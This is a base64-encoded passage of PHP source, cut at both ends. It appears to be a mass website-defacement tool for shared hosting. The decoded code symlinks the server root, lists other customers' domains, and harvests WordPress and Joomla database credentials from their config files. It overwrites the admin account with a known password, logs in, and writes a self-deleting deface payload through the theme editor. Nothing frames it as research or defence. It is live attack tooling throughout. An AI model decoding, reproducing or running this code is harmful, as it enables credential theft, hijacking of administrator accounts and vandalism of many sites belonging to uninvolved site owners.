dXJsMik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIDEpOw0KY3VybF9zZXRvcHQoJGNoLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCAwKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICR1c2VyYWdlbnQpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUpBUiwgJGNvKTsgDQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFRklMRSwgJGNvKTsgDQokYnVmZmVyID0gY3VybF9leGVjKCRjaCk7DQokaGlkZGVuMj10dW5pc2lhKCRidWZmZXIgLCc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSInLCciIHZhbHVlPSIxIicsNik7DQppZigkaGlkZGVuMikgew0KJG91dHB1dC49ICJbK10gaW5kZXgucGhwIGZpbGUgZm91bmRlZCBpbiBUaGVtZSBFZGl0b3I8YnIgLz4iOw0KfSBlbHNlIHsNCiRvdXRwdXQuPSAiWy1dIGluZGV4LnBocCBOb3QgZm91bmQgaW4gVGhlbWUgRWRpdG9yPGJyIC8+IjsNCn0NCn0NCg0KaWYoJGhpZGRlbjIpIHsNCiR1cmwyPSRzaXRlX3VybC4iL2luZGV4LnBocD9vcHRpb249Y29tX3RlbXBsYXRlcyZsYXlvdXQ9ZWRpdCI7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsMik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVCwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywiZmlsZWNvbnRlbnQ9Ii4kY29udGVudC4iJmlkPSIuJHRlbXBsYXRlX25hbWUuIiZjaWRbXT0iLiR0ZW1wbGF0ZV9uYW1lLiImIi4kaGlkZGVuMi4iPTEmdGFzaz1zYXZlX3NvdXJjZSZjbGllbnQ9MCIpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsNCmN1cmxfc2V0b3B0KCRjaCxDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICRjbyk7IA0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICRjbyk7IA0KJGJ1ZmZlciA9IGN1cmxfZXhlYygkY2gpOw0KY3VybF9jbG9zZSgkY2gpOw0KDQokcG9zID0gc3RycG9zKCRidWZmZXIsJzxkZCBjbGFzcz0ibWVzc2FnZSBtZXNzYWdlIGZhZGUiPicpOw0KJGNvbmQgPSAwOw0KaWYoJHBvcyA9PT0gZmFsc2UpIHsNCiRvdXRwdXQuPSAiWy1dIFVwZGF0aW5nIEluZGV4LnBocCBFcnJvcjxiciAvPiI7DQp9IGVsc2Ugew0KJG91dHB1dC49ICJbK10gSW5kZXgucGhwIFRlbXBsYXRlIHN1Y2Nlc3NmdWxseSBzYXZlZDxiciAvPiI7DQokY29uZCA9IDE7DQp9DQp9DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkb3V0cHV0Lj0gIlstXSBEQiBFcnJvcjxiciAvPiI7DQogICAgfQ0KICAgIGdsb2JhbCAkYmFzZV9wYXRoOw0KICAgIHVubGluaygkYmFzZV9wYXRoLiRjbyk7DQogICAgcmV0dXJuIGFycmF5KCdjb25kJz0+JGNvbmQsICdvdXRwdXQnPT4kb3V0cHV0ICwgJ3RlbXBsYXRlJz0+JHRlbXBsYXRlX25hbWUpOyANCn0NCg0KDQovLyB3b3JkcHJlc3MgaW5kZXggY2hhbmdlcg0KDQpmdW5jdGlvbiBpbmRleF9jaGFuZ2VyX3dwKCRjb25mLCAkaW5kZXgpIHsNCiRkb2wgPSAnJCc7DQokcHJlaW5kZXggPSAiPD9waHANCiIuJGRvbC4iZGVmID0gZmlsZV9nZXRfY29udGVudHMoJyIuJGluZGV4LiInKTsNCiIuJGRvbC4icCA9IGV4cGxvZGUoJ3B1YmxpY19odG1sJyxkaXJuYW1lKF9fRklMRV9fKSk7DQoiLiRkb2wuInAgPSAiLiRkb2wuInBbMF0uJ3B1YmxpY19odG1sJzsNCmlmICgiLiRkb2wuImhhbmRsZSA9IG9wZW5kaXIoIi4kZG9sLiJwKSkgew0KICAgICIuJGRvbC4icDEgPSBAZm9wZW4oIi4kZG9sLiJwLicvaW5kZXguaHRtbCcsJ3crJyk7DQogICAgQGZ3cml0ZSgiLiRkb2wuImZwMSwgIi4kZG9sLiJkZWYpOw0KICAgICIuJGRvbC4icDEgPSBAZm9wZW4oIi4kZG9sLiJwLicvaW5kZXgucGhwJywndysnKTsNCiAgICBAZndyaXRlKCIuJGRvbC4iZnAxLCAiLiRkb2wuImRlZik7DQogICAgIi4kZG9sLiJmcDEgPSBAZm9wZW4oIi4kZG9sLiJwLicvaW5kZXguaHRtJywndysnKTsNCiAgICBAZndyaXRlKCIuJGRvbC4iZnAxLCAiLiRkb2wuImRlZik7DQogICAgZWNobyAnRG9uZSc7DQp9DQpjbG9zZWRpcigiLiRkb2wuImhhbmRsZSk7DQp1bmxpbmsoX19GSUxFX18pOw0KPz4iOw0KJGNvbnRlbnQgPSBiYXNlNjRfZW5jb2RlKCRwcmVpbmRleCk7DQogICAgJG91dHB1dCA9ICcnOw0KICAgICRkb2wgPSAnJCc7DQogICAgJGdvID0gMDsNCiAgICAkdXNlcm5hbWUgPSB0dW5pc2lhKCRjb25mLCJkZWZpbmUoJ0RCX1VTRVInLCAnIiwiJyk7Iik7DQogICAgJHBhc3N3b3JkID0gdHVuaXNpYSgkY29uZiwiZGVmaW5lKCdEQl9QQVNTV09SRCcsICciLCInKTsiKTsNCiAgICAkZGJuYW1lID0gdHVuaXNpYSgkY29uZiwiZGVmaW5lKCdEQl9OQU1FJywgJyIsIicpOyIpOw0KICAgICRwcmVmaXggPSB0dW5pc2lhKCRjb25mLCRkb2wuInRhYmxlX3ByZWZpeCAgPSAnIiwiJyIpOw0KICAgICRob3N0ID0gdHVuaXNpYSgkY29uZiwiZGVmaW5lKCdEQl9IT1NUJywgJyIsIicpOyIpOw0KDQogICAgJGxpbms9bXlzcWxfY29ubmVjdCgkaG9zdCwkdXNlcm5hbWUsJHBhc3N3b3JkKTsNCiAgICBpZigkbGluaykgew0KICAgICAgICBteXNxbF9zZWxlY3RfZGIoJGRibmFtZSwkbGluaykgOw0KICAgICAgICAkZG9sID0gJyQnOw0KICAgICAgICAkcmVxMSA9IG15c3FsX3F1ZXJ5KCJVUERBVEUgYCIuJHByZWZpeC4idXNlcnNgIFNFVCBgdXNlcl9sb2dpbmAgPSAnYWRtaW4nLGB1c2VyX3Bhc3NgID0gJzQyOTdmNDRiMTM5NTUyMzUyNDViMjQ5NzM5OWQ3YTkzJyBXSEVSRSBgSURgID0gMSIpOw0KICAgIH0gZWxzZSB7DQogICAgICAgICRvdXRwdXQuPSAiWy1dIERCIEVycm9yPGJyIC8+IjsNCiAgICB9DQogICAgaWYoJHJlcTEpIHsNCg0KICAgICAgICAkcmVxID0gbXlzcWxfcXVlcnkoIlNFTEVDVCAqIGZyb20gIGAiLiRwcmVmaXguIm9wdGlvbnNgIFdIRVJFIG9wdGlvbl9uYW1lPSdob21lJyIpOw0KICAgICAgICAkZGF0YSA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXEpOw0KICAgICAgICAkc2l0ZV91cmw9JGRhdGFbIm9wdGlvbl92YWx1ZSJdOyANCg0KICAgICAgICAkcmVxID0gbXlzcWxfcXVlcnkoIlNFTEVDVCAqIGZyb20gIGAiLiRwcmVmaXguIm9wdGlvbnNgIFdIRVJFIG9wdGlvbl9uYW1lPSd0ZW1wbGF0ZSciKTsNCiAgICAgICAgJGRhdGEgPSBteXNxbF9mZXRjaF9hcnJheSgkcmVxKTsNCiAgICAgICAgJHRlbXBsYXRlID0gJGRhdGFbIm9wdGlvbl92YWx1ZSJdOw0KDQogICAgICAgICRyZXEgPSBteXNxbF9xdWVyeSgiU0VMRUNUICogZnJvbSAgYCIuJHByZWZpeC4ib3B0aW9uc2AgV0hFUkUgb3B0aW9uX25hbWU9J2N1cnJlbnRfdGhlbWUnIik7DQogICAgICAgICRkYXRhID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlcSk7DQogICAgICAgICRjdXJyZW50X3RoZW1lID0gJGRhdGFbIm9wdGlvbl92YWx1ZSJdOw0KDQogICAgICAgICR1c2VyYWdlbnQ9Ik1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMGI7IFdpbmRvd3MgTlQgNS4xOyAuTkVUIENMUiAxLjEuNDMyMjsgQWxleGEgVG9vbGJhcjsgLk5FVCBDTFIgMi4wLjUwNzI3KSI7DQogICAgICAgICR1cmwyPSRzaXRlX3VybC4iL3dwLWxvZ2luLnBocCI7DQoNCiAgICAgICAgJGNoID0gY3VybF9pbml0KCk7DQogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwyKTsNCiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIDEpOw0KICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywibG9nPWFkbWluJnB3ZD0xMjMxMjMmcmVtZW1iZXJtZT1mb3JldmVyJndwLXN1Ym1pdD1Mb2cgSW4mdGVzdGNvb2tpZT0xIik7DQogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7DQogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwxKTsNCiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT05ORUNUVElNRU9VVCwgMTApOw0KICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUpBUiwgIkNPT0tJRS50eHQiKTsNCiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICJDT09LSUUudHh0Iik7DQogICAgICAgICRidWZmZXIgPSBjdXJsX2V4ZWMoJGNoKTsNCg0KICAgICAgICAkcG9zID0gc3RycG9zKCRidWZmZXIsImFjdGlvbj1sb2dvdXQiKTsNCiAgICAgICAgaWYoJHBvcyA9PT0gZmFsc2UpIHsNCiRvdXRwdXQuPSAiWy1dIExvZ2luIEVycm9yPGJyIC8+IjsNCiAgICAgICAgfSBlbHNlIHsNCiRvdXRwdXQuPSAiWytdIExvZ2luIFN1Y2Nlc3NmdWw8YnIgLz4iOw0KJGdvID0gMTsNCiAgICAgICAgfQ0KICAgICAgICBpZigkZ28pIHsNCiRjb25kID0gMDsNCiR1cmwyPSRzaXRlX3VybC4iL3dwLWFkbWluL3RoZW1lLWVkaXRvci5waHA/ZmlsZT0vdGhlbWVzLyIuJHRlbXBsYXRlLicvaW5kZXgucGhwJnRoZW1lPScudXJsZW5jb2RlKCRjdXJyZW50X3RoZW1lKS4nJmRpcj10aGVtZSc7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsMik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIDApOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICJDT09LSUUudHh0Iik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFRklMRSwgIkNPT0tJRS50eHQiKTsNCiRidWZmZXIwID0gY3VybF9leGVjKCRjaCk7DQoNCiRfd3Bub25jZSA9IHR1bmlzaWEoJGJ1ZmZlcjAsJzxpbnB1dCB0eXBlPSJoaWRkZW4iIGlkPSJfd3Bub25jZSIgbmFtZT0iX3dwbm9uY2UiIHZhbHVlPSInLCciIC8+Jyk7DQokX2ZpbGUgPSB0dW5pc2lhKCRidWZmZXIwLCc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmaWxlIiB2YWx1ZT0iJywnIiAvPicpOw0KDQppZihzdWJzdHJfY291bnQoJF9maWxlLCIvaW5kZXgucGhwIikgIT0gMCl7DQokb3V0cHV0Lj0gIlsrXSBpbmRleC5waHAgbG9hZGVkIGluIFRoZW1lIEVkaXRvcjxiciAvPiI7DQokdXJsMj0kc2l0ZV91cmwuIi93cC1hZG1pbi90aGVtZS1lZGl0b3IucGhwIjsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwyKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NULCAxKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCJuZXdjb250ZW50PSIuYmFzZTY0X2RlY29kZSgkY29udGVudCkuIiZhY3Rpb249dXBkYXRlJmZpbGU9Ii4kX2ZpbGUuIiZfd3Bub25jZT0iLiRfd3Bub25jZS4iJnN1Ym1pdD1VcGRhdGUgRmlsZSIpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCAwKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICR1c2VyYWdlbnQpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUpBUiwgIkNPT0tJRS50eHQiKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVGSUxFLCAiQ09PS0lFLnR4dCIpOw0KJGJ1ZmZlciA9IGN1cmxfZXhlYygkY2gpOw0KY3VybF9jbG9zZSgkY2gpOw0KDQokcG9zID0gc3RycG9zKCRidWZmZXIsJzxkaXYgaWQ9Im1lc3NhZ2UiIGNsYXNzPSJ1cGRhdGVkIj4nKTsNCmlmKCRwb3MgPT09IGZhbHNlKSB7DQokb3V0cHV0Lj0gIlstXSBVcGRhdGluZyBJbmRleC5waHAgRXJyb3I8YnIgLz4iOw0KfSBlbHNlIHsNCiRvdXRwdXQuPSAiWytdIEluZGV4LnBocCBVcGRhdGVkIFN1Y2Nlc3NmdWx5PGJyIC8+IjsNCiRoayA9IGV4cGxvZGUoJ3B1YmxpY19odG1sJywkX2ZpbGUpOw0KJG91dHB1dC49ICdbK10gRGVmYWNlICcuZmlsZV9nZXRfY29udGVudHMoJHNpdGVfdXJsLnN0cl9yZXBsYWNlKCcvYmxvZycsJycsJGhrWzFdKSk7DQokY29uZCA9IDE7DQp9DQp9IGVsc2Ugew0KJHVybDI9JHNpdGVfdXJsLicvd3AtYWRtaW4vdGhlbWUtZWRpdG9yLnBocD9maWxlPWluZGV4LnBocCZ0aGVtZT0nLiR0ZW1wbGF0ZTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwyKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICJDT09LSUUudHh0Iik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFRklMRSwgIkNPT0tJRS50eHQiKTsNCiRidWZmZXIwID0gY3VybF9leGVjKCRjaCk7DQoNCiRfd3Bub25jZSA9IHR1bmlzaWEoJGJ1ZmZlcjAsJzxpbnB1dCB0eXBlPSJoaWRkZW4iIGlkPSJfd3Bub25jZSIgbmFtZT0iX3dwbm9uY2UiIHZhbHVlPSInLCciIC8+Jyk7DQokX2ZpbGUgPSB0dW5pc2lhKCRidWZmZXIwLCc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmaWxlIiB2YWx1ZT0iJywnIiAvPicpOw0KDQppZihzdWJzdHJfY291bnQoJF9maWxlLCJpbmRleC5waHAiKSAhPSAwKXsNCiRvdXRwdXQuPSAiWytdIGluZGV4LnBocCBsb2FkZWQgaW4gVGhlbWUgRWRpdG9yPGJyIC8+IjsNCiR1cmwyPSRzaXRlX3VybC4iL3dwLWFkbWluL3RoZW1lLWVkaXRvci5waHAiOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybDIpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1RGSUVMRFMsIm5ld2NvbnRlbnQ9Ii5iYXNlNjRfZGVjb2RlKCRjb250ZW50KS4iJmFjdGlvbj11cGRhdGUmZmlsZT0iLiRfZmlsZS4iJnRoZW1lPSIuJHRlbXBsYXRlLiImX3dwbm9uY2U9Ii4kX3dwbm9uY2UuIiZzdWJtaXQ9VXBkYXRlIEZpbGUiKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICJDT09LSUUudHh0Iik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFRklMRSwgIkNPT0tJRS50eHQiKTsNCiRidWZmZXIgPSBjdXJsX2V4ZWMoJGNoKTsNCmN1cmxfY2xvc2UoJGNoKTsNCg0KJHBvcyA9IHN0cnBvcygkYnVmZmVyLCc8ZGl2IGlkPSJtZXNzYWdlIiBjbGFzcz0idXBkYXRlZCI+Jyk7DQppZigkcG9zID09PSBmYWxzZSkgew0KICAgICRvdXRwdXQuPSAiWy1dIFVwZGF0aW5nIEluZGV4LnBocCBFcnJvcjxiciAvPiI7DQp9IGVsc2Ugew0KICAgICRvdXRwdXQuPSAiWytdIEluZGV4LnBocCBUZW1wbGF0ZSBVcGRhdGVkIFN1Y2Nlc3NmdWx5PGJyIC8+IjsNCgkkb3V0cHV0Lj0gJ1srXSBEZWZhY2UgJy5maWxlX2dldF9jb250ZW50cygkc2l0ZV91cmwuJy93cC1jb250ZW50L3RoZW1lcy8nLiR0ZW1wbGF0ZS4nL2luZGV4LnBocCcpOw0KICAgICRjb25kID0gMTsNCn0NCn0gZWxzZSB7DQokb3V0cHV0Lj0gIlstXSBpbmRleC5waHAgY2FuIG5vdCBsb2FkIGluIFRoZW1lIEVkaXRvcjxiciAvPiI7DQp9DQp9DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkb3V0cHV0Lj0gIlstXSBEQiBFcnJvcjxiciAvPiI7DQogICAgfQ0KICAgIGdsb2JhbCAkYmFzZV9wYXRoOw0KICAgIHVubGluaygkYmFzZV9wYXRoLidDT09LSUUudHh0Jyk7DQogICAgcmV0dXJuIGFycmF5KCdjb25kJz0+JGNvbmQsICdvdXRwdXQnPT4kb3V0cHV0ICwgJ3RlbXBsYXRlJz0+ICR0ZW1wbGF0ZSk7DQp9DQoNCmlmKCRfUE9TVFsnbW9kZSddPT0yKSB7DQovLyBzeW1saW5raW5nIA0KQG1rZGlyKCdzeW0nLDA3NzcpOw0KJGh0YWNjZXNzICA9ICJPcHRpb25zIGFsbCBcbiBEaXJlY3RvcnlJbmRleCBTdXguaHRtbCBcbiBBZGRUeXBlIHRleHQvcGxhaW4gLnBocCBcbiBBZGRIYW5kbGVyIHNlcnZlci1wYXJzZWQgLnBocCBcbiBBZGRUeXBlIHRleHQvcGxhaW4gLmh0bWwgXG4gQWRkSGFuZGxlciB0eHQgLmh0bWwgXG4gUmVxdWlyZSBOb25lIFxuIFNhdGlzZnkgQW55IjsNCmZpbGVfcHV0X2NvbnRlbnRzKCJzeW0vLmh0YWNjZXNzIiwkaHRhY2Nlc3MpOw0KQHN5bWxpbmsoJy8nLCdzeW0vcm9vdCcpOw0KDQoNCi8vIGdldHRpbmcgc2l0ZXMgZnJvbSAoL3Zhci9uYW1lZCkgZmlsZQ0KJG5hbWVkPWZpbGVfZ2V0X2NvbnRlbnRzKCRiYXNlX3VybC4nL3N5bS9yb290L3Zhci9uYW1lZC8nKTsNCiRhciA9IGV4cGxvZGUoJzxsaT48YSBocmVmPSInLCAkbmFtZWQpOw0KZm9yKCR2aT0yOyR2aSA8IGNvdW50KCRhcik7JHZpKyspDQogICAgIHsNCiR2YXIxID0gc3RydG9rKCRhclskdmldLCAiICIpOw0KJHZhcjEgPSBzdWJzdHIoJHZhcjEsMCwtMik7DQokb2xkPSgnLmRiJyk7DQokbmV3PSgnJyk7DQokc2l0ZXMgPSBzdHJfcmVwbGFjZSgkb2xkICwgJG5ldyAsICR2YXIxKTsNCmZpbGVfcHV0X2NvbnRlbnRzKCdzaXRlcy50eHQnLCRzaXRlcyk7DQp9DQoNCi8vIGdldHRpbmcgdXNlcm5hbWVzDQokZG9tYWlucz1maWxlKCdzaXRlcy50eHQnKTsNCmZvcmVhY2ggKCRkb21haW5zIGFzICRkb21haW4pIHsNCiRvcmRlcj0oImxzIC1sYSAvZXRjL3ZhbGlhc2VzLyIuJGRvbWFpbik7DQokZXhlYz1leGVjKCRvcmRlcik7DQokZmlsZW5hbWUgPSAnbWFpbC50eHQnOw0KJGZwID0gZm9wZW4oJGZpbGVuYW1lLCAiYSsiKTsNCiR3cml0ZSA9IGZwdXRzKCRmcCwgJGV4ZWMuIlxuIik7DQpmY2xvc2UoJGZwKTsNCn0NCg0KJG1haWw9ZmlsZSgnbWFpbC50eHQnKTsNCmZvcmVhY2ggKCRtYWlsIGFzICRmaW5hbGRvbSkgew0KJHVzZXI9dHVuaXNpYSgkZmluYWxkb20sIi1ydy1yLS0tLS0gMSAiLCIgbWFpbCIpOw0KJHNpdGU9c3Vic3RyKHN0cnN0cigkZmluYWxkb20sICcvZXRjL3ZhbGlhc2VzJyksMTQpOw0KDQokZmlsZW5hbWUgPSAndXNlcmRvbS50eHQnOw0KJGZwID0gZm9wZW4oJGZpbGVuYW1lLCAiYSsiKTsNCiR3cml0ZSA9IGZwdXRzKCRmcCwgJHVzZXIuIjoiLiAkc2l0ZS4iICIpOw0KZmNsb3NlKCRmcCk7DQoNCn0NCg0KJGY9ZmlsZV9nZXRfY29udGVudHMoJ3VzZXJkb20udHh0Jyk7DQokZmluYWxzPWV4cGxvZGUoIiAiLCRmKTsNCmZvcmVhY2ggKCRmaW5hbHMgYXMgJGZpbmFsKXsNCiRzdHJsZW49KCc2Jyk7DQokZHI9c3RybGVuICgkZmluYWwpOw0KaWYgKCRkciA8ICRzdHJsZW4pIHsNCiRmaWxlbmFtZSA9ICdmYWlsLnR4dCc7DQokZnAgPSBmb3BlbigkZmlsZW5hbWUsICJhIik7DQokd3JpdGUgPSBmcHV0cygkZnAsICRmaW5hbCk7DQpmY2xvc2UoJGZwKTsNCn0NCmVsc2Ugew0KJGZpbGVuYW1lID0gJ3N1Y2Nlc3MudHh0JzsNCiRmcCA9IGZvcGVuKCRmaWxlbmFtZSwgImEiKTsNCiR3cml0ZSA9IGZwdXRzKCRmcCwgJGZpbmFsLiJcbiIpOw0KZmNsb3NlKCRmcCk7DQp9DQp9DQoNCi8vIG5vdyB0byB3b3JrDQokaW5kZXg9JF9QT1NUWyd0dW5pc2lhJ107DQokdXJsPSgkYmFzZV91cmwpOw0KJGE9ZmlsZSgkYmFzZV91cmwuJy9zdWNjZXNzLnR4dCcpOw0KZWNobyAoIjxjZW50ZXI+PHRhYmxlIGNsYXNzPSdyZXN1bHQnIHdpZHRoPScxMDAlJyBib3JkZXI9MSBjZWxsc3BhY2luZz0xIGNlbGxwYWRpbmc9MT4gIA0KPHRyPjx0aCB3aWR0aD01MCU+ZG9tYWluPC90ZD48dGggd2lkdGg9MjUlPlR5cGU8L3RkPjx0aCB3aWR0aD0yNSU+U3RhdHVzPC90ZD48L3RyPiIpOw0KJGtoYWxlZCA9IGZvcGVuKCdkZWZhY2VkLmh0bWwnLCAnYSsnKTsNCmZvcmVhY2ggKCRhIGFzICRmaW5hbCkgew0KbGlzdCgkdXNlciwgJHNpdGVfdXJsKSA9IGV4cGxvZGUoIjoiLCAkZmluYWwpOw0KJHNpdGVfdXJsdG8gPSBzdWJzdHIoJHNpdGVfdXJsLCAwLCAtMSk7DQovLyBqb29tbGEgc3ltbGlua3MNCiRqb29tbGE9JHVybC4iL3N5bS9yb290L2hvbWUvIi4kdXNlci4iL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwIjsNCiRqb29tbGEyPSR1cmwuIi9zeW0vcm9vdC9ob21lLyIuJHVzZXIuIi9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAiOw0KJGpvb21sYTM9JHVybC4iL3N5bS9yb290L2hvbWUvIi4kdXNlci4iL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAiOw0KLy8gd29yZHByZXNzIHN5bWxpbmtzDQokd29yZHByZXNzPSR1cmwuIi9zeW0vcm9vdC9ob21lLyIuJHVzZXIuIi9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwIjsNCiR3b3JkcHJlc3MyPSR1cmwuIi9zeW0vcm9vdC9ob21lLyIuJHVzZXIuIi9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAiOw0KJHdvcmRwcmVzczM9JHVybC4iL3N5bS9yb290L2hvbWUvIi4kdXNlci4iL3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZy5waHAiOw0KDQovLyBmaXJzdCBqb29tbGEgZ3Vlc3MNCmlmKCRqb29tbGEgJiYgcHJlZ19tYXRjaCgnL2RicHJlZml4L2knLCRqb29tbGEpKXsNCmVjaG8gJzx0cj48dGQ+PGEgaHJlZj0iaHR0cDovLycuJHNpdGVfdXJsdG8uJyIgdGFyZ2V0PSJibGFuayI+Jy4kc2l0ZV91cmx0by4nPC9hPjwvdGQ+JzsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48Zm9udCBjb2xvcj0icGluayI+Sk9PTUxBPC9mb250PjwvdGQ+JzsNCiRyZXMgPSBpbmRleF9jaGFuZ2VyX2pvb21sYSgkam9vbWxhLCAkaW5kZXgsICRzaXRlX3VybHRvKTsNCmVjaG8gJzx0ZD4nLiRyZXNbJ291dHB1dCddLic8L3RkPic7DQppZigkcmVzWydjb25kJ10pIHsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48c3BhbiBjbGFzcz0iZ3JlZW4iPkRFRkFDRUQ8L3NwYW4+PC90ZD4nOw0KZndyaXRlKCRraGFsZWQsICdodHRwOi8vJy4kc2l0ZV91cmx0by4nL3RlbXBsYXRlcy8nLiRyZXNbJ3RlbXBsYXRlJ10uJy9pbmRleC5waHA8YnI+Jyk7DQokY291bnQxID0gJGNvdW50MSsxOw0KfSBlbHNlIHsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48c3BhbiBjbGFzcz0icmVkIj5GQUlMRUQ8L3NwYW4+PC90ZD4nOw0KfQ0KZWNobyAnPC90cj4nOw0KfQ0KLy8gc2Vjb25kIGpvb21sYSBndWVzcw0KaWYoJGpvb21sYTIgJiYgcHJlZ19tYXRjaCgnL2RicHJlZml4L2knLCRqb29tbGEyKSl7DQplY2hvICc8dHI+PHRkPjxhIGhyZWY9Imh0dHA6Ly8nLiRzaXRlX3VybHRvLiciIHRhcmdldD0iYmxhbmsiPicuJHNpdGVfdXJsdG8uJzwvYT48L3RkPic7DQplY2hvICc8dGQgYWxpZ249ImNlbnRlciI+PGZvbnQgY29sb3I9InBpbmsiPkpPT01MQTwvZm9udD48L3RkPic7DQokcmVzID0gaW5kZXhfY2hhbmdlcl9qb29tbGEoJGpvb21sYTIsICRpbmRleCwgJHNpdGVfdXJsdG8pOw0KZWNobyAnPHRkPicuJH